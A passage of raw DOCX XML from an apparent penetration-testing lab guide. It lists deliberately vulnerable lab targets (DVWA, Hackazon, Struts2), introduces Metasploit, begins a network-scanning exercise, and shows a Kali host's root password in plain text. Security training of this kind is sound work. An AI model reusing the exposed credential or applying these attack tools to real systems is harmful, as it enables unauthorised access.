            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EF7E646" w14:textId="2DDA05C0" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Taxi App</w:t>
            </w:r>
            <w:r w:rsidR="00A4529F">
              <w:t xml:space="preserve"> (unprotected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="374A0DF5" w14:textId="26B85209" w:rsidR="00EA3568" w:rsidRDefault="00EA3568" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.</w:t>
            </w:r>
            <w:r w:rsidR="005D4A34">
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:t>0.</w:t>
            </w:r>
            <w:r w:rsidR="005D4A34">
              <w:t>131</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F0633AA" w14:textId="082FEDE7" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1BF8DB6C" w14:textId="56D78735" w:rsidR="00EA3568" w:rsidRPr="00A4529F" w:rsidRDefault="00A4529F">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>h</w:t>
            </w:r>
            <w:r w:rsidR="005D4A34">
              <w:t>ttp</w:t>
            </w:r>
            <w:r>
              <w:t>://taxiapp</w:t>
            </w:r>
            <w:r w:rsidR="005D4A34">
              <w:t>-unprotected</w:t>
            </w:r>
            <w:r>
              <w:t>.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="601DF2E2" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57C8B0CD" w14:textId="31C66719" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Taxi App </w:t>
            </w:r>
            <w:r>
              <w:br/>
              <w:t>(protected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49337AD2" w14:textId="454EC766" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.132</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56FB95AA" w14:textId="1D571CBE" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0CA990A0" w14:textId="15E15BCC" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>http://taxiapp.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="437648BC" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77FBC11C" w14:textId="27D15281" w:rsidR="00EA3568" w:rsidRDefault="0052583B" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>Hackazon</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidR="00A4529F">
              <w:t xml:space="preserve"> (unprotected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="102C366D" w14:textId="4F563D2A" w:rsidR="00EA3568" w:rsidRDefault="00A4529F" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.1</w:t>
            </w:r>
            <w:r w:rsidR="005D4A34">
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0B30B2C4" w14:textId="18888184" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6646C166" w14:textId="190F2055" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://webstore-unprotected.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="1A8A1F0C" w14:textId="77777777" w:rsidTr="005D4A34">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2BD1369B" w14:textId="11AF7005" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>Hackazon</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:br/>
              <w:t>(protected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="142897C7" w14:textId="529B0DFD" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="74535AFF" w14:textId="5AE33E5F" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3CD6E132" w14:textId="285E50CB" w:rsidR="00EA3568" w:rsidRDefault="005D4A34" w:rsidP="00F47D73">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>http://webstore.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="5E845F01" w14:textId="77777777" w:rsidTr="00526315">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0259BB16" w14:textId="5F743726" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>DVWA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="476AEC7B" w14:textId="542C3C16" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.35</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BFF16B1" w14:textId="4009F7FA" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="341681F5" w14:textId="2BD9D95B" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://dvwa.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="702FC7AC" w14:textId="77777777" w:rsidTr="00526315">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02481738" w14:textId="5B2815D1" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>HR Site</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="22AF74EB" w14:textId="07DE60AB" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.101</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="40253058" w14:textId="21D2D227" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6DBC69B2" w14:textId="0BCF6218" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://hr.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="792590CE" w14:textId="77777777" w:rsidTr="00526315">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EC5A87C" w14:textId="55166438" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Intranet Site</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FDD8EDD" w14:textId="7B177E9E" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.102</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61BE8AD3" w14:textId="4F61733A" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65E0B8FC" w14:textId="7E45C152" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://accounts.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="668899CC" w14:textId="77777777" w:rsidTr="00526315">
        <w:trPr>
          <w:cnfStyle w:val="000000010000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="1" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7EB4908C" w14:textId="60AECABA" w:rsidR="005D4A34" w:rsidRPr="005D4A34" w:rsidRDefault="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Struts2 </w:t>
            </w:r>
            <w:r>
              <w:br/>
              <w:t>(unprotected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="701A3E2C" w14:textId="2438EF5B" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="39D00CCE" w14:textId="33D85366" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7D88072F" w14:textId="5398F2F6" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://struts2.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D4A34" w14:paraId="05108B86" w14:textId="77777777" w:rsidTr="00526315">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1342" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="22D5B810" w14:textId="3BFC16A7" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>Struts2</w:t>
            </w:r>
            <w:r>
              <w:br/>
              <w:t>(protected)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1260" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C02F4E2" w14:textId="1183CE6F" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>10.1.10.51</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18796F5A" w14:textId="407E7DEC" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>External</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3503" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="05B17CE2" w14:textId="0D3B85C0" w:rsidR="005D4A34" w:rsidRDefault="005D4A34" w:rsidP="005D4A34">
            <w:pPr>
              <w:pStyle w:val="Tablecopy"/>
            </w:pPr>
            <w:r>
              <w:t>https://struts2-protected.f5lab.biz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66FAF981" w14:textId="55837613" w:rsidR="0052583B" w:rsidRPr="00BA3D24" w:rsidRDefault="0052583B" w:rsidP="00526315"/>
    <w:p w14:paraId="573764DA" w14:textId="77777777" w:rsidR="00D629FA" w:rsidRDefault="00D629FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="231F20" w:themeColor="text1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="510D67CA" w14:textId="2E4D6EA7" w:rsidR="004A179B" w:rsidRDefault="00144506" w:rsidP="0052583B">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc487296564"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:r w:rsidR="0052583B">
        <w:t xml:space="preserve"> Overview:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="0A5396F7" w14:textId="0314BB7C" w:rsidR="004A179B" w:rsidRDefault="002B3278" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Metasploit is more than just a ‘tool’, it was envisioned as a Framework where tools, exploits, payloads and other hacker-related things would be able to exist, allowing a penetration tester/hacker/researcher to focus on what they wanted to do instead of having to cobble together many different scripts. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041AE8A1" w14:textId="32553B6C" w:rsidR="002B3278" w:rsidRDefault="002B3278" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Metasploit has been </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>growing in size</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> since </w:t>
      </w:r>
      <w:r w:rsidR="00144506">
        <w:t>its</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> first release </w:t>
      </w:r>
      <w:r w:rsidR="00144506">
        <w:t xml:space="preserve">in 2003, first built by a man named HD Moore using some basic </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00144506">
        <w:t>perl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00144506">
        <w:t xml:space="preserve"> scripts.  Metasploit 2.0 was release</w:t>
      </w:r>
      <w:r w:rsidR="00A4529F">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00144506">
        <w:t xml:space="preserve"> in October 2004, by Moore and a larger team and has been expanding ever since with contributions from the larger hacker-centric community.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3664EF10" w14:textId="1FA24BA1" w:rsidR="00144506" w:rsidRDefault="00144506" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Metasploit is essentially a console where many different modules work together to allow a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pentester</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to set common components up and then execute code against potentially vulnerable targets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303C265F" w14:textId="3391D643" w:rsidR="00144506" w:rsidRDefault="00144506" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>The exploits within Metasploit are many and varied – you can attack anything from a Mainframe to a Smartphone with a few simple commands.  And the exploits and payloads within Metasploit are configurable and can be updated whenever there are newly released vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A2BDBB" w14:textId="19B86A45" w:rsidR="00A4529F" w:rsidRDefault="00A4529F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="231F20" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DB35DE" w14:textId="1FA3A332" w:rsidR="004A179B" w:rsidRDefault="004A179B" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc487296565"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Exercise </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00856D39">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Scanning the Network</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="05AE7213" w14:textId="77777777" w:rsidR="004A179B" w:rsidRDefault="004A179B" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MSFconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105AF003" w14:textId="77777777" w:rsidR="004A179B" w:rsidRDefault="004A179B" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>MSFconsole is a command line interface to access the modules of Metasploit. It is the most commonly used component of Metasploit and quite likely where you’d spend most of your time for testing vulnerabilities. The only possible downside is that you need to be ‘on’ the Metasploit computer itself – either via ssh or logged in locally.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F237353" w14:textId="77777777" w:rsidR="004A179B" w:rsidRDefault="004A179B" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>To access MSFconsole, do the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0C3243" w14:textId="43E8BEF0" w:rsidR="004A179B" w:rsidRDefault="004A179B" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Use putty on the Win 7 Client to SSH to the Kali Linux host CLI</w:t>
      </w:r>
      <w:r w:rsidR="00620AD5">
        <w:t xml:space="preserve"> (10.1.10.240)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="002217CA">
        <w:t>root / 401elliottW!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F0F899" w14:textId="77777777" w:rsidR="00D04158" w:rsidRDefault="00620AD5" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46B57B3B" wp14:editId="3B456DE9">
            <wp:extent cx="3717819" cy="3573947"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="14" name="Picture 14" descr="/Users/maburns/Desktop/Screen Shot 2017-06-09 at 9.4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burns/Desktop/Screen Shot 2017-06-09 at 9.40.1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716" cy="3590191"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7DF1A1" w14:textId="77777777" w:rsidR="00CA1332" w:rsidRDefault="00CA1332" w:rsidP="004A179B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="71965790" wp14:editId="2FAA19F0">
            <wp:extent cx="4871085" cy="304963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472" cy="3080552"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8AF24F" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Intelligence Gathering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7EB8A8" w14:textId="77777777" w:rsidR="005D73A7" w:rsidRDefault="005D73A7" w:rsidP="005D73A7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When a hacker wants to infiltrate your network, they start with gathering Intel.  There are many tools which can search for and identify devices and applications on the network.  Some are larger tools such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (discussed below), Nessus from Tenable (</w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidRPr="00C05730">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>www.tenable.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>), Nexpose from Rapid7 (</w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidRPr="00C05730">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.rapid7.com/free-tools/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">) or even </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
